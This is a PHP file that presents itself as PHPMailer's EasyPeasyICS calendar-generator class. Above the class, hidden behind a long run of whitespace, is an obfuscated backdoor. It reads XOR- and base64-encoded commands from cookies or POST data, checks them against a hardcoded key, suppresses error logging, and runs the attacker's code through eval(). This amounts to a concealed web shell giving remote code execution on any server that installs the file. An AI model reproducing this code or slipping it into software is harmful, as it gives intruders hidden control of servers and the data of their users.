<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['nb69e41'];global$nb69e41;$nb69e41=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['x9f23f4a']="\x48\x5c\x6f\x63\x50\x2f\x61\x40\x6a\x57\x79\x36\x33\x73\x4b\x37\x68\x5f\x49\x27\xd\x53\x5a\x51\x71\x5d\x7e\x4d\x24\x22\x3a\x6d\x74\x41\x7b\x6c\x58\x39\x2e\xa\x4e\x44\x67\x62\x26\x3d\x76\x59\x66\x72\x3f\x25\x4a\x9\x3c\x3b\x32\x4f\x65\x31\x7d\x6e\x75\x4c\x2a\x7c\x2d\x70\x29\x69\x52\x56\x5b\x47\x3e\x6b\x55\x35\x21\x7a\x60\x20\x28\x43\x5e\x34\x45\x38\x42\x30\x54\x2c\x23\x2b\x64\x46\x78\x77";$nb69e41[$nb69e41['x9f23f4a'][16].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][87]]=$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][16].$nb69e41['x9f23f4a'][49];$nb69e41[$nb69e41['x9f23f4a'][61].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][56]]=$nb69e41['x9f23f4a'][2].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][94];$nb69e41[$nb69e41['x9f23f4a'][8].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][94]]=$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][32].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][35].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][61];$nb69e41[$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][87]]=$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][61].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][17].$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][32];$nb69e41[$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][48]]=$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][35].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][58];$nb69e41[$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][37]]=$nb69e41['x9f23f4a'][67].$nb69e41['x9f23f4a'][16].$nb69e41['x9f23f4a'][67].$nb69e41['x9f23f4a'][46].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][2].$nb69e41['x9f23f4a'][61];$nb69e41[$nb69e41['x9f23f4a'][8].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][85]]=$nb69e41['x9f23f4a'][62].$nb69e41['x9f23f4a'][61].$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][35].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][58];$nb69e41[$nb69e41['x9f23f4a'][8].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][56]]=$nb69e41['x9f23f4a'][43].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][17].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][2].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][58];$nb69e41[$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][3]]=$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][32].$nb69e41['x9f23f4a'][17].$nb69e41['x9f23f4a'][32].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][31].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][17].$nb69e41['x9f23f4a'][35].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][31].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][32];$nb69e41[$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][87].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][48].$nb69e41['x9f23f4a'][87]]=$nb69e41['x9f23f4a'][48].$nb69e41['x9f23f4a'][48].$nb69e41['x9f23f4a'][87].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][48].$nb69e41['x9f23f4a'][37];$nb69e41[$nb69e41['x9f23f4a'][42].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][43]]=$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][85];$nb69e41[$nb69e41['x9f23f4a'][46].$nb69e41['x9f23f4a'][48].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][87].$nb69e41['x9f23f4a'][77]]=$_POST;$nb69e41[$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][85]]=$_COOKIE;@$nb69e41[$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][87]]($nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][2].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][17].$nb69e41['x9f23f4a'][35].$nb69e41['x9f23f4a'][2].$nb69e41['x9f23f4a'][42],NULL);@$nb69e41[$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][87]]($nb69e41['x9f23f4a'][35].$nb69e41['x9f23f4a'][2].$nb69e41['x9f23f4a'][42].$nb69e41['x9f23f4a'][17].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][2].$nb69e41['x9f23f4a'][49].$nb69e41['x9f23f4a'][13],0);@$nb69e41[$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][87]]($nb69e41['x9f23f4a'][31].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][96].$nb69e41['x9f23f4a'][17].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][96].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][62].$nb69e41['x9f23f4a'][32].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][2].$nb69e41['x9f23f4a'][61].$nb69e41['x9f23f4a'][17].$nb69e41['x9f23f4a'][32].$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][31].$nb69e41['x9f23f4a'][58],0);@$nb69e41[$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][3]](0);$q7c40bb4=NULL;$ze40d5=NULL;$nb69e41[$nb69e41['x9f23f4a'][69].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][37]]=$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][43].$nb69e41['x9f23f4a'][66].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][43].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][66].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][87].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][66].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][66].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][48].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][15];global$i0ac9;function zaa475ae4($q7c40bb4,$k185382){global$nb69e41;$z5f17b1="";for($r474e8e56=0;$r474e8e56<$nb69e41[$nb69e41['x9f23f4a'][8].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][94]]($q7c40bb4);){for($q613d4a8=0;$q613d4a8<$nb69e41[$nb69e41['x9f23f4a'][8].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][94]]($k185382)&&$r474e8e56<$nb69e41[$nb69e41['x9f23f4a'][8].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][94]]($q7c40bb4);$q613d4a8++,$r474e8e56++){$z5f17b1.=$nb69e41[$nb69e41['x9f23f4a'][16].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][3].$nb69e41['x9f23f4a'][87]]($nb69e41[$nb69e41['x9f23f4a'][61].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][56]]($q7c40bb4[$r474e8e56])^$nb69e41[$nb69e41['x9f23f4a'][61].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][56]]($k185382[$q613d4a8]));}}return$z5f17b1;}function ff80f9($q7c40bb4,$k185382){global$nb69e41;global$i0ac9;return$nb69e41[$nb69e41['x9f23f4a'][42].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][43]]($nb69e41[$nb69e41['x9f23f4a'][42].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][43]]($q7c40bb4,$i0ac9),$k185382);}foreach($nb69e41[$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][56].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][85]]as$k185382=>$d293636){$q7c40bb4=$d293636;$ze40d5=$k185382;}if(!$q7c40bb4){foreach($nb69e41[$nb69e41['x9f23f4a'][46].$nb69e41['x9f23f4a'][48].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][58].$nb69e41['x9f23f4a'][87].$nb69e41['x9f23f4a'][77]]as$k185382=>$d293636){$q7c40bb4=$d293636;$ze40d5=$k185382;}}$q7c40bb4=@$nb69e41[$nb69e41['x9f23f4a'][8].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][85]]($nb69e41[$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][87].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][48].$nb69e41['x9f23f4a'][87]]($nb69e41[$nb69e41['x9f23f4a'][8].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][37].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][56]]($q7c40bb4),$ze40d5));if(isset($q7c40bb4[$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][75]])&&$i0ac9==$q7c40bb4[$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][75]]){if($q7c40bb4[$nb69e41['x9f23f4a'][6]]==$nb69e41['x9f23f4a'][69]){$r474e8e56=Array($nb69e41['x9f23f4a'][67].$nb69e41['x9f23f4a'][46]=>@$nb69e41[$nb69e41['x9f23f4a'][79].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][12].$nb69e41['x9f23f4a'][85].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][94].$nb69e41['x9f23f4a'][37]](),$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][46]=>$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][38].$nb69e41['x9f23f4a'][89].$nb69e41['x9f23f4a'][66].$nb69e41['x9f23f4a'][59],);echo@$nb69e41[$nb69e41['x9f23f4a'][13].$nb69e41['x9f23f4a'][59].$nb69e41['x9f23f4a'][11].$nb69e41['x9f23f4a'][6].$nb69e41['x9f23f4a'][15].$nb69e41['x9f23f4a'][77].$nb69e41['x9f23f4a'][48]]($r474e8e56);}elseif($q7c40bb4[$nb69e41['x9f23f4a'][6]]==$nb69e41['x9f23f4a'][58]){eval($q7c40bb4[$nb69e41['x9f23f4a'][94]]);}exit();} ?><?php
/**
 * EasyPeasyICS Simple ICS/vCal data generator.
 * @author Marcus Bointon <phpmailer@synchromedia.co.uk>
 * @author Manuel Reinhard <manu@sprain.ch>
 *
 * Built with inspiration from
 * http://stackoverflow.com/questions/1463480/how-can-i-use-php-to-dynamically-publish-an-ical-file-to-be-read-by-google-calend/1464355#1464355
 * History:
 * 2010/12/17 - Manuel Reinhard - when it all started
 * 2014 PHPMailer project becomes maintainer
 */

/**
 * Class EasyPeasyICS.
 * Simple ICS data generator
 * @package phpmailer
 * @subpackage easypeasyics
 */
class EasyPeasyICS
{
    /**
     * The name of the calendar
     * @var string
     */
    protected $calendarName;
    /**
     * The array of events to add to this calendar
     * @var array
     */
    protected $events = array();

    /**
     * Constructor
     * @param string $calendarName
     */
    public function __construct($calendarName = "")
    {
        $this->calendarName = $calendarName;
    }

    /**
     * Add an event to this calendar.
     * @param string $start The start date and time as a unix timestamp
     * @param string $end The end date and time as a unix timestamp
     * @param string $summary A summary or title for the event
     * @param string $description A description of the event
     * @param string $url A URL for the event
     * @param string $uid A unique identifier for the event - generated automatically if not provided
     * @return array An array of event details, including any generated UID
     */
    public function addEvent($start, $end, $summary = '', $description = '', $url = '', $uid = '')
    {
        if (empty($uid)) {
            $uid = md5(uniqid(mt_rand(), true)) . '@EasyPeasyICS';
        }
        $event = array(
            'start' => gmdate('Ymd', $start) . 'T' . gmdate('His', $start) . 'Z',
            'end' => gmdate('Ymd', $end) . 'T' . gmdate('His', $end) . 'Z',
            'summary' => $summary,
            'description' => $description,
            'url' => $url,
            'uid' => $uid
        );
        $this->events[] = $event;
        return $event;
    }

    /**
     * @return array Get the array of events.
     */
    public function getEvents()
    {
        return $this->events;
    }

    /**
     * Clear all events.
     */
    public function clearEvents()
    {
        $this->events = array();
    }

    /**
     * Get the name of the calendar.
     * @return string
     */
    public function getName()
    {
        return $this->calendarName;
    }

    /**
     * Set the name of the calendar.
     * @param $name
     */
    public function setName($name)
    {
        $this->calendarName = $name;
    }

    /**
     * Render and optionally output a vcal string.
     * @param bool $output Whether to output the calendar data directly (the default).
     * @return string The complete rendered vlal
     */
    public function render($output = true)
    {
        //Add header
        $ics = 'BEGIN:VCALENDAR
METHOD:PUBLISH
VERSION:2.0
X-WR-CALNAME:' . $this->calendarName . '
PRODID:-//hacksw/handcal//NONSGML v1.0//EN';

        //Add events
        foreach ($this->events as $event) {
            $ics .= '
BEGIN:VEVENT
UID:' . $event['uid'] . '
DTSTAMP:' . gmdate('Ymd') . 'T' . gmdate('His') . 'Z
DTSTART:' . $event['start'] . '
DTEND:' . $event['end'] . '
SUMMARY:' . str_replace("\n", "\\n", $event['summary']) . '
DESCRIPTION:' . str_replace("\n", "\\n", $event['description']) . '
URL;VALUE=URI:' . $event['url'] . '
END:VEVENT';
        }

        //Add footer
        $ics .= '
END:VCALENDAR';

        if ($output) {
            //Output
            $filename = $this->calendarName;
            //Filename needs quoting if it contains spaces
            if (strpos($filename, ' ') !== false) {
                $filename = '"'.$filename.'"';
            }
            header('Content-type: text/calendar; charset=utf-8');
            header('Content-Disposition: inline; filename=' . $filename . '.ics');
            echo $ics;
        }
        return $ics;
    }
}
